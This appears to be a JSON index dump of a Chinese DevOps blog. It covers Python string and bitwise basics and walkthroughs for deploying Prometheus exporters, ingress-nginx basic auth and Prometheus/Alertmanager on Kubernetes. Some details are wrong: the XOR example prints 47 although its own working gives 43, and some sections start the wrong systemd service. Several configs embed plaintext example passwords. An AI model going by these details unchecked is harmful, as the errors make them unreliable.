# 0\u003e4：长度不满足4的话，在数值的前面用0进行补齐，.1f:保留1位小数(四舍五入) print('已下载{:0\u003e4.1f}%'.format(5.21)) # 不解析转义符 print('内容:{0}\\n原内容{0!r}'.format('soul\\nchild')) 内容:soul child 原内容'soul\\nchild' ","date":"2020-08-31 08:48","objectID":"/post/1956/:2:0","tags":["python"],"title":"python-字符串格式化","uri":"/post/1956/"},{"categories":["python"],"content":"1.查找 s='asnd82nkldodkspby' #find和index都是查找字符串的下标，find找不到会返回-1，index会抛出异常 s.find('n') #2 s.index('n') #2 ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:1","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"2.字符串判断 startswith、endswith、isalpha、isdigit、isalnum、isspace #是否以h开头 'helloworld'.startswith('h') #是否以d结尾 'helloworld'.endswith('d') #是否全是字母 'helloworld'.isalpha() #是否全是数字,只认正整数，不认小数、负数 'helloworld'.isdigit() #是否全是字母数字 'helloworld'.isalnum() #是否全是空格 'helloworld'.isspace() ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:2","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"3.统计字符串出现次数 print('helloworld'.count('o')) 2 ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:3","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"4.字符串替换 # 将l替换为w，替换1次，不指定次数就全部替换 print('helloworld'.replace('l','w',1)) ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:4","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"5.字符串分割 split、rsplit、partition、rpartition #split################################################### s='python|java|golang|ruby|erlang|php' # 以`|`分割3次，返回一个列表。不指定次数就全部分割 s.split('|',3) # 结果：['python', 'java', 'golang', 'ruby|erlang|php'] # 从右边开始分割 s.rsplit('|',3) # 结果：['python|java|golang', 'ruby', 'erlang', 'php'] #partition############################################### url=\"www.soulchild.cn\" # 将字符串分割为三部分，分别是:'分割符前面的内容'、'分割符'、'分割符后面的内容'。 # 只会以最左边的分割符开始分割 url.partition('soulchild') # 结果：('www.', 'soulchild', '.cn') # 从右边开始分割 url.rpartition('soulchild') ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:5","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"6.修改大小写 capitalize:首字母转换成大写 upper:全部转换成大写 lower:全部转换成小写 title:每个单词的首字母转换成大写 # capitalize: print('hello world'.capitalize()) # 结果： Hello world ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:6","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"7.空格处理 ljust: 在最右边用空格补够字符长度。默认是空格也可以自己指定fillchar参数 rjust: 同上，但是会在最左边补 center: 在两边补，字符串在中间 lstrip: 去除左边空格,默认去除空格，也可以指定其他字符–chars参数 rstrip: 去除右边空格,默认去除空格，也可以指定其他字符–chars参数 strip: 首尾去除空格,默认去除空格，也可以指定其他字符–chars参数 # hello有5个字符，我们要10个，所以在hello后面会补5个空格 print('hello'.ljust(10)) ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:7","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"8.拼接可迭代对象 join: 使用指定的字符串连接可迭代对象的每一个元素，生成一个新的字符串 s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] # 使用/将列表的每一个元素连接起来 print('/'.join(s)) # 结果: python/java/golang/ruby/erlang/php ","date":"2020-08-30 17:04","objectID":"/post/1951/:0:8","tags":["python"],"title":"python-字符串基本操作","uri":"/post/1951/"},{"categories":["python"],"content":"拿字符串举例： s=\"helloworld\" 切片语法： s[start🔚step] 从0切到5: s[0:5]：hello 从1切到最后 s[1:]：elloworld 从开头开始切3位 s[:3]：：hel 从第一位切到倒数第五位 s[1:-5]：ello 指定步长为2 s[2:8:2]：loo 倒着取 s[-2:2:-1]：lrowol 反转 s[::-1]：dlrowolleh ","date":"2020-08-30 13:19","objectID":"/post/1948/:0:0","tags":["python"],"title":"python-切片","uri":"/post/1948/"},{"categories":["python"],"content":"先简单说一些概念： 原码：从符号位开始表示，0是正数，1是负数 反码： 正数的原码反码补码都是一样的。 负数的反码是在其原码的基础上, 符号位不变，其余各个位取反 比如-5转成二进制原码1101，在算出反码1010 补码： 正数的原码反码补码都是一样的。 负数的补码是反码+1 ","date":"2020-08-29 22:10","objectID":"/post/1947/:0:0","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"1.按位与\u0026: #下面的与运算结果是4 \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a \u0026 b 4 # 计算过程 首先将a和b转换成二进制补码,每一位进行与运算，上下两个数都为1结果就是1，否则为0 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0000 0100 = 4 ","date":"2020-08-29 22:10","objectID":"/post/1947/:1:0","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"2.按位或|: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a | b 47 # 计算过程 首先将a和b转换成二进制补码,每一位进行或运算，上下两个数只要有一个数为1结果就是1，否则为0 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0010 1111 = 47 ","date":"2020-08-29 22:10","objectID":"/post/1947/:2:0","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"3.按位异或^: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e b = 36 \u003e\u003e\u003e a ^ b 47 # 计算过程 首先将a和b转换成二进制补码,每一位进行异或运算，上下两个数相同为0，不同为1 a = 0000 1111 = 15 b = 0010 0100 = 36 res = 0010 1011 = 43 ","date":"2020-08-29 22:10","objectID":"/post/1947/:3:0","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"4.按位取反~: \u003e\u003e\u003e a = 15 \u003e\u003e\u003e ~a -16 #计算过程 首先将a转换成二进制补码,每一位进行取反 a = 0000 1111 = 15 not = 1111 0000 = 符号位为1(即负数) 补码 ------------------------------------------------------- #已知补码计算反码(上面说到了负数的补码=反码+1，所以补码-1=反码) 1111 0000 - 1 --------------------- 1110 1111 反码 #已知反码求原码(负数的反码=原码的符号位不变，其余各个位取反， #所以我们将数值位取反即可算出原码) 1110 1111 1001 0000 原码 #至此就算出了取反后的原码，我们在用8421法将二进制原码换算成10进制，最后的结果就是-16 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:0","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"按位左移\u003c\u003c: \u003e\u003e\u003e a = 15 #左移两位 \u003e\u003e\u003e a \u003c\u003c 2 60 # 计算过程 首先将a转换成二进制补码，然后往左边移动两位，右边少的两位用0来补 a = 0000 1111 = 15 000011 1100 = 60 0011 1100 = 60 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:1","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["python"],"content":"按位右移动\u003e\u003e: \u003e\u003e\u003e a = 15 #右移两位 \u003e\u003e\u003e a \u003e\u003e 2 3 # 计算过程 首先将a转换成二进制补码，然后往右移动两位，左边少的两位用0来补 a = 0000 1111 = 15 0000 0011 = 3 ","date":"2020-08-29 22:10","objectID":"/post/1947/:4:2","tags":["python"],"title":"python-位运算","uri":"/post/1947/"},{"categories":["kubernetes"],"content":"1.创建认证文件(注意文件名必须叫auth) htpasswd -bc auth admin 123456 ","date":"2020-08-28 11:00","objectID":"/post/1946/:1:0","tags":["k8s"],"title":"ingress-nginx配置basic认证","uri":"/post/1946/"},{"categories":["kubernetes"],"content":"2.生成secret kubectl create secret generic --from-file=auth --namespace=kube-ops prome-basic-auth ","date":"2020-08-28 11:00","objectID":"/post/1946/:2:0","tags":["k8s"],"title":"ingress-nginx配置basic认证","uri":"/post/1946/"},{"categories":["kubernetes"],"content":"3.配置ingress apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: prometheus namespace: kube-ops annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: prome-basic-auth nginx.ingress.kubernetes.io/auth-realm: '提示信息' spec: rules: - host: prom.soulchild.cn http: paths: - path: / backend: serviceName: prometheus servicePort: http ","date":"2020-08-28 11:00","objectID":"/post/1946/:3:0","tags":["k8s"],"title":"ingress-nginx配置basic认证","uri":"/post/1946/"},{"categories":["监控"],"content":"1.下载源码： git clone https://github.com.cnpmjs.org/oliver006/redis_exporter.git cd redis_exporter git checkout v1.6.1 vim exporter.go 注释第92行的u.User = nil # 本地没有go环境，使用docker编译 docker run -it --env=GOPROXY=https://goproxy.cn,direct --workdir=/redis_exporter -v /server/packages/redis_exporter/:/redis_exporter golang:1.15 go build . mv redis_exporter /usr/local/bin/ 2.制作启动服务： vim /usr/lib/systemd/system/redis_exporter.service [Unit] Description=redis_exporter Documentation=https://github.com/prometheus/redis_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/redis_exporter Restart=on-failure [Install] WantedBy=multi-user.target 4.启动服务： systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.配置prometheus，多实例监控(可以使用文件自动发现) 手动测试：localhost:9121/scrape?target=redis://h:123123@127.0.0.1:6380 scrape_configs: - job_name: 'redis_exporter' static_configs: - targets: - redis://h:redis@10.0.0.10:6379 - redis://h:123123@10.0.0.10:6380 - redis://h:123456@10.0.0.10:6381 - redis://h:@10.0.0.10:6382 metrics_path: /scrape relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] separator: ; regex: redis://h.*@(.*):(\\d+) target_label: instance replacement: ${1}:${2} action: replace - target_label: __address__ replacement: 10.0.0.73:9121 #redis_exporter的地址端口 ","date":"2020-08-26 11:12","objectID":"/post/1943/:0:0","tags":["prometheus"],"title":"redis_exporter部署配置多实例","uri":"/post/1943/"},{"categories":["监控"],"content":"1.下载安装 wget https://github.91chifun.workers.dev//https://github.com/prometheus/blackbox_exporter/releases/download/v0.17.0/blackbox_exporter-0.17.0.linux-amd64.tar.gz tar xf blackbox_exporter-0.17.0.linux-amd64.tar.gz mv blackbox_exporter-0.17.0.linux-amd64/blackbox_exporter /usr/local/bin/ mkdir /etc/blackbox_exporter mv blackbox_exporter-0.17.0.linux-amd64/blackbox.yml /etc/blackbox_exporter/ 2.添加启动用户： useradd prometheus chown -R prometheus.prometheus /etc/blackbox_exporter/ 3.修改配置文件 su prometheus vim /etc/blackbox_exporter/blackbox.yml modules: http_2xx: prober: http http_post_2xx: prober: http http: method: POST tcp_connect: prober: tcp pop3s_banner: prober: tcp tcp: query_response: - expect: \"^+OK\" tls: true tls_config: insecure_skip_verify: false ssh_banner: prober: tcp tcp: query_response: - expect: \"^SSH-2.0-\" irc_banner: prober: tcp tcp: query_response: - send: \"NICK prober\" - send: \"USER prober prober prober :prober\" - expect: \"PING :([^ ]+)\" send: \"PONG ${1}\" - expect: \"^:[^ ]+ 001\" icmp: prober: icmp example: # 这个是自定义的module名称 prober: http # 探测的协议，支持http, dns, tcp, icmp, grpc timeout: 5s # 探测超时 http: {} # http协议相关参数 配置参数文档 https://github.com/prometheus/blackbox_exporter/blob/master/CONFIGURATION.md 4.配置启动服务： vim /usr/lib/systemd/system/blackbox_exporter.service [Unit] Description=blackbox_exporter Documentation=https://github.com/prometheus/blackbox_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/blackbox_exporter \\ --config.file=/etc/blackbox_exporter/blackbox.yml --history.limit=100 Restart=on-failure [Install] WantedBy=multi-user.target 5.启动 systemctl start blackbox_exporter.service systemctl enable blackbox_exporter.service 6.配置prometheus 我们获取metrics的方式为如下url： http://localhost:9115/probe?target=xxx.com\u0026module=http_2xx 其中xxx.com是目标地址，module是配置文件中配置的探测模板,我们的目标地址不是一个，所以我们使用文件自动发现加relabel__param_target标签的值的方式来进行配置 - job_name: 'blackbox_exporter' metrics_path: /probe params: module: [http_2xx] file_sd_configs: - refresh_interval: 10s files: - blackbox.json relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.0.200:9115 # blackbox_exporter的地址和端口 blackbox.json配置 [{ \"targets\": [\"http://s1.soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"jpress\" } }, { \"targets\": [\"http://s2.soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"app\" } }, { \"targets\": [\"http://1.1.1.1:3221\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"server\" } }, { \"targets\": [\"https://soulchild.cn\"], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"blog\" } } ] ","date":"2020-08-26 11:05","objectID":"/post/1942/:0:0","tags":["prometheus"],"title":"blackbox_exporter部署","uri":"/post/1942/"},{"categories":["监控"],"content":"1.下载安装： wget https://github.91chifun.workers.dev//https://github.com/wrouesnel/postgres_exporter/blob/v0.8.0/queries.yaml wget https://github.91chifun.workers.dev//https://github.com/wrouesnel/postgres_exporter/releases/download/v0.8.0/postgres_exporter_v0.8.0_linux-amd64.tar.gz tar xf postgres_exporter_v0.8.0_linux-amd64.tar.gz mv postgres_exporter_v0.8.0_linux-amd64/postgres_exporter /usr/local/bin/ mkdir /etc/postgres_exporter/ mv queries.yaml /etc/postgres_exporter/ chown -R postgres.postgres /etc/postgres_exporter/ queries.yaml文件为自定义指标文件，有需要的话可以自定义。 2.创建数据库监控用户、函数、视图： -- To use IF statements, hence to be able to check if the user exists before -- attempting creation, we need to switch to procedural SQL (PL/pgSQL) -- instead of standard SQL. -- More: https://www.postgresql.org/docs/9.3/plpgsql-overview.html -- To preserve compatibility with \u003c9.0, DO blocks are not used; instead, -- a function is created and dropped. CREATE OR REPLACE FUNCTION __tmp_create_user() returns void as $$ BEGIN IF NOT EXISTS ( SELECT -- SELECT list can stay empty for this FROM pg_catalog.pg_user WHERE usename = 'postgres_exporter') THEN CREATE USER postgres_exporter; END IF; END; $$ language plpgsql; SELECT __tmp_create_user(); DROP FUNCTION __tmp_create_user(); ALTER USER postgres_exporter WITH PASSWORD '123456'; ALTER USER postgres_exporter SET SEARCH_PATH TO postgres_exporter,pg_catalog; -- If deploying as non-superuser (for example in AWS RDS), uncomment the GRANT -- line below and replace \u003cMASTER_USER\u003e with your root user. -- GRANT postgres_exporter TO \u003cMASTER_USER\u003e; CREATE SCHEMA IF NOT EXISTS postgres_exporter; GRANT USAGE ON SCHEMA postgres_exporter TO postgres_exporter; GRANT CONNECT ON DATABASE postgres TO postgres_exporter; CREATE OR REPLACE FUNCTION get_pg_stat_activity() RETURNS SETOF pg_stat_activity AS $$ SELECT * FROM pg_catalog.pg_stat_activity; $$ LANGUAGE sql VOLATILE SECURITY DEFINER; CREATE OR REPLACE VIEW postgres_exporter.pg_stat_activity AS SELECT * from get_pg_stat_activity(); GRANT SELECT ON postgres_exporter.pg_stat_activity TO postgres_exporter; CREATE OR REPLACE FUNCTION get_pg_stat_replication() RETURNS SETOF pg_stat_replication AS $$ SELECT * FROM pg_catalog.pg_stat_replication; $$ LANGUAGE sql VOLATILE SECURITY DEFINER; CREATE OR REPLACE VIEW postgres_exporter.pg_stat_replication AS SELECT * FROM get_pg_stat_replication(); GRANT SELECT ON postgres_exporter.pg_stat_replication TO postgres_exporter; 3.创建启动服务 vim /usr/lib/systemd/system/postgres_exporter.service [Unit] Description=postgres_exporter Documentation=https://github.com/wrouesnel/postgres_exporter After=network.target [Service] Type=simple User=postgres Environment=\"DATA_SOURCE_NAME=postgresql://postgres_exporter:123456@localhost:5432/postgres?sslmode=disable\" ExecStart=/usr/local/bin/postgres_exporter --log.level=error # --extend.query-path=quires.yaml Restart=on-failure [Install] WantedBy=multi-user.target 4.启动服务 systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.配置prometheus scrape_configs: - job_name: postgres_exporter static_configs: - targets: ['10.0.0.72:9187'] labels: instance: 'test-db' ","date":"2020-08-26 11:03","objectID":"/post/1940/:0:0","tags":["prometheus"],"title":"postgres_exporter部署","uri":"/post/1940/"},{"categories":["监控"],"content":"1.下载安装： wget https://github.91chifun.workers.dev//https://github.com/percona/mongodb_exporter/releases/download/v0.11.1/mongodb_exporter-0.11.1.linux-amd64.tar.gz mkdir mongodb_exporter tar xf mongodb_exporter-0.11.1.linux-amd64.tar.gz -C mongodb_exporter mv mongodb_exporter/mongodb_exporter /usr/local/bin/ 2.创建mongodb监控用户 db.getSiblingDB(\"admin\").createUser({ user: \"mongodb_exporter\", pwd: \"123456\", roles: [ { role: \"clusterMonitor\", db: \"admin\" }, { role: \"read\", db: \"local\" } ] }) 3.设置启动服务 vim /usr/lib/systemd/system/mongodb_exporter.service [Unit] Description=mongodb_exporter Documentation=https://github.com/percona/mongodb_exporter After=network.target [Service] Type=simple User=prometheus Environment=\"MONGODB_URI=mongodb://mongodb_exporter:123456@localhost:27017\" ExecStart=/usr/local/bin/mongodb_exporter --log.level=error \\ --collect.database \\ --collect.collection \\ --collect.topmetrics \\ --collect.indexusage \\ --collect.connpoolstats Restart=on-failure [Install] WantedBy=multi-user.target 4.配置prometheus - job_name: mongodb_exporter static_configs: - targets: ['10.0.0.72:9216'] ","date":"2020-08-26 11:02","objectID":"/post/1939/:0:0","tags":["prometheus"],"title":"mongodb_exporter部署","uri":"/post/1939/"},{"categories":["监控"],"content":"1.下载安装： wget https://github.91chifun.workers.dev//https://github.com/prometheus/mysqld_exporter/releases/download/v0.12.1/mysqld_exporter-0.12.1.linux-amd64.tar.gz tar xf mysqld_exporter-0.12.1.linux-amd64.tar.gz mv mysqld_exporter-0.12.1.linux-amd64/mysqld_exporter /usr/local/bin/mysqld_exporter 2.创建监控用户： CREATE USER 'exporter'@'localhost' IDENTIFIED BY '123456' WITH MAX_USER_CONNECTIONS 3; GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO 'exporter'@'localhost'; 3.制作启动服务： vim /usr/lib/systemd/system/mysqld_exporter.service [Unit] Description=mysqld_exporter Documentation=https://github.com/prometheus/mysqld_exporter After=network.target [Service] Type=simple User=mysql Environment=DATA_SOURCE_NAME=exporter:123456@(localhost:3306)/ ExecStart=/usr/local/bin/mysqld_exporter --web.listen-address=0.0.0.0:9104 \\ --log.level=error \\ --collect.info_schema.innodb_metrics \\ --collect.info_schema.innodb_tablespaces \\ --collect.info_schema.innodb_cmp \\ --collect.info_schema.innodb_cmpmem Restart=on-failure [Install] WantedBy=multi-user.target 4.启动服务： systemctl start mysqld_exporter systemctl enable mysqld_exporter 5.测试metrics curl localhost:9104/metrics 6.配置prometheus scrape_configs: - job_name: mysqld_exporter static_configs: - targets: ['10.0.0.73:9104'] ","date":"2020-08-26 11:01","objectID":"/post/1936/:0:0","tags":["prometheus"],"title":"mysqld_exporter部署","uri":"/post/1936/"},{"categories":["监控"],"content":"下载安装node_exporter： wget https://github.91chifun.workers.dev//https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.linux-amd64.tar.gz tar xf node_exporter-1.0.1.linux-amd64.tar.gz cd node_exporter-1.0.1.linux-amd64/ mv node_exporter /usr/local/bin/ 添加启动用户： useradd prometheus 配置启动服务： vim /usr/lib/systemd/system/node_exporter.service [Unit] Description=node_export Documentation=https://github.com/prometheus/node_exporter After=network.target [Service] Type=simple User=prometheus ExecStart=/usr/local/bin/node_exporter Restart=on-failure [Install] WantedBy=multi-user.target 启动： systemctl start node_exporter.service systemctl enable node_exporter.service 添加prometheus配置： - job_name: database_node_exporter static_configs: - targets: ['10.0.0.72:9100','10.0.0.73:9100'] ","date":"2020-08-26 11:00","objectID":"/post/1935/:0:0","tags":["prometheus"],"title":"node_exporter部署","uri":"/post/1935/"},{"categories":["监控","kubernetes"],"content":"一、prometheus ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:0","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"1.创建pv、pvc apiVersion: v1 kind: PersistentVolume metadata: name: prometheus spec: capacity: storage: 10Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Retain nfs: server: 10.0.0.10 path: /nfsdata/ --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: prometheus namespace: kube-ops spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:1","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"2.配置rbac apiVersion: v1 kind: ServiceAccount metadata: name: prometheus namespace: kube-ops --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: prometheus rules: - apiGroups: - \"\" resources: - nodes - services - endpoints - pods - nodes/proxy verbs: - get - list - watch - apiGroups: - \"\" resources: - configmaps - nodes/metrics verbs: - get - nonResourceURLs: - /metrics verbs: - get --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: prometheus roleRef: apiGroup: \"\" kind: ClusterRole name: prometheus subjects: - kind: ServiceAccount name: prometheus namespace: kube-ops ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:2","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"3.创建service apiVersion: v1 kind: Service metadata: name: prometheus namespace: kube-ops annotations: prometheus.io/scrape: \"true\" prometheus.io/port: \"9090\" spec: selector: app: prometheus type: NodePort ports: - name: http port: 9090 targetPort: http nodePort: 30002 ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:3","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"4.创建configmap apiVersion: v1 kind: ConfigMap metadata: name: prometheus-conf namespace: kube-ops data: rules.yml: | groups: - name: 系统硬件告警 rules: - alert: NodeFilesystemUsage expr: (node_filesystem_size_bytes{mountpoint=\"/rootfs\"} - node_filesystem_free_bytes{mountpoint=\"/rootfs\"} ) / node_filesystem_size_bytes{mountpoint=\"/rootfs\"} * 100 \u003e 80 for: 10s labels: filesystem: node annotations: summary: \"{{ $labels.instance }}:磁盘使用量\" description: \"{{ $labels.instance }}: rootfs使用{{ $value }},大于总容量的80%\" - alert: NodeMemoryUsage expr: (node_memory_MemTotal_bytes - (node_memory_MemFree_bytes + node_memory_Buffers_bytes + node_memory_Cached_bytes)) / node_memory_MemTotal_bytes * 100 \u003e 90 for: 10s labels: team: node annotations: summary: \"{{ $labels.instance }}: node节点内存使用过高\" description: \"{{ $labels.instance }}: 内存使用大于90%，当前已用{{ $value }}%\" prometheus.yml: | global: scrape_interval: 15s evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: [\"alertmanager:9093\"] rule_files: - \"/etc/prometheus/rules.yml\" # - \"second.rules\" scrape_configs: - job_name: prometheus static_configs: - targets: ['localhost:9090'] - job_name: node_exporter kubernetes_sd_configs: - role: node relabel_configs: - source_labels: [__address__] regex: \"(.*):10250\" target_label: __address__ replacement: \"${1}:9100\" - action: labelmap regex: \"__meta_kubernetes_node_label_(.*)\" - job_name: 'kubernetes-kubelet' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - job_name: 'kubernetes-cadvisor' kubernetes_sd_configs: - role: node scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) - action: replace source_labels: [__meta_kubernetes_node_name] regex: (.*) target_label: __metrics_path__ replacement: /api/v1/nodes/${1}/proxy/metrics/cadvisor - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default.svc:443 - job_name: 'kubernetes-api-services' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: endpoints relabel_configs: - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default:443 - action: keep source_labels: [__meta_kubernetes_namespace,__meta_kubernetes_endpoint_port_name,__meta_kubernetes_service_name] regex: default;https;kubernetes - action: labelmap regex: __meta_kubernetes_(.+) - job_name: 'kubernetes-service-endpoints' kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape] action: keep regex: true # 将label标签中的端口替换为annotations中指定的端口 - action: replace source_labels: [__address__,__meta_kubernetes_service_annotation_prometheus_io_port] target_label: __address__ regex: (.*?):(\\d+);(\\d+) replacement: ${1}:${3} # 动态获取scheme，确保http和https都可以进行采集 - action: replace source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme] target_label: __scheme__ regex: (https?) - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path] action: replace target_label: __metrics_path__ regex: (.+) - source_labels: [__address__, __meta_kubernetes_service_annotation_prometheus_io_port] action: replace target_label: __address__ regex: ([^:]+)(?::\\d+)?;(\\d+) replacement: $1:$2 - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] a","date":"2020-08-26 10:53","objectID":"/post/1933/:1:4","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"5.部署node_exporter apiVersion: extensions/v1beta1 kind: DaemonSet metadata: name: node-exporter namespace: kube-ops labels: name: node-exporter spec: template: metadata: labels: name: node-exporter spec: hostPID: true hostIPC: true hostNetwork: true containers: - name: node-exporter image: prom/node-exporter:v0.16.0 ports: - containerPort: 9100 resources: requests: cpu: 0.15 securityContext: privileged: true args: - --path.procfs - /host/proc - --path.sysfs - /host/sys - --collector.filesystem.ignored-mount-points - '\"^/(sys|proc|dev|host|etc)($|/)\"' volumeMounts: - name: dev mountPath: /host/dev - name: proc mountPath: /host/proc - name: sys mountPath: /host/sys - name: rootfs mountPath: /rootfs tolerations: - key: \"node-role.kubernetes.io/master\" operator: \"Exists\" effect: \"NoSchedule\" volumes: - name: proc hostPath: path: /proc - name: dev hostPath: path: /dev - name: sys hostPath: path: /sys - name: rootfs hostPath: path: / ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:5","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"6.部署prometheus deployment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: prometheus namespace: kube-ops labels: app: prometheus spec: selector: matchLabels: app: prometheus template: metadata: labels: app: prometheus spec: serviceAccountName: prometheus containers: - name: prometheus image: prom/prometheus:v2.15.2 command: - \"/bin/prometheus\" args: - \"--config.file=/etc/prometheus/prometheus.yml\" - \"--storage.tsdb.path=/prometheus\" - \"--storage.tsdb.retention=7d\" - \"--web.enable-admin-api\" - \"--web.enable-lifecycle\" ports: - name: http containerPort: 9090 protocol: TCP volumeMounts: - name: config mountPath: \"/etc/prometheus\" - name: data subPath: prometheus mountPath: \"/prometheus\" resources: requests: cpu: 0.05 memory: 512Mi limits: cpu: 1 memory: 2Gi volumes: - name: config configMap: name: prometheus-conf - name: data persistentVolumeClaim: claimName: prometheus ","date":"2020-08-26 10:53","objectID":"/post/1933/:1:6","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"二、alertmanager 1.configmap apiVersion: v1 kind: ConfigMap metadata: name: alert-config namespace: kube-ops data: wechat.tmpl: |- {{ define \"__alert_list\" }}{{ range . -}} 告警名称: {{ index .Annotations \"summary\" }} 告警级别: {{ .Labels.severity }} 告警主机: {{ .Labels.instance }} 告警信息: {{ index .Annotations \"description\" }} 维护团队: {{ .Labels.team | toUpper }} 告警时间: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"__resolved_list\" }}{{ range . -}} 告警名称: {{ index .Annotations \"summary\" }} 告警级别: {{ .Labels.severity }} 告警主机: {{ .Labels.instance }} 告警信息: {{ index .Annotations \"description\" }} 维护团队: {{ .Labels.team | toUpper }} 告警时间: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} 恢复时间: {{ .EndsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"wechat.tmpl\" }} {{- if gt (len .Alerts.Firing) 0 -}} ====侦测到{{ .Alerts.Firing | len }}个故障==== {{ template \"__alert_list\" .Alerts.Firing }} {{ end -}} {{- if gt (len .Alerts.Resolved) 0 -}} ====恢复{{ .Alerts.Resolved | len }}个故障==== {{ template \"__resolved_list\" .Alerts.Resolved }} {{- end -}} {{ end }} config.yml: |- templates: - '/etc/alertmanager/*.tmpl' global: # 在没有报警的情况下声明为已解决的时间 resolve_timeout: 5m # 配置邮件发送信息 smtp_smarthost: 'smtp.qq.com:465' smtp_from: '742899387@qq.com' smtp_auth_username: '742899387@qq.com' smtp_auth_password: '123123123' smtp_require_tls: false # 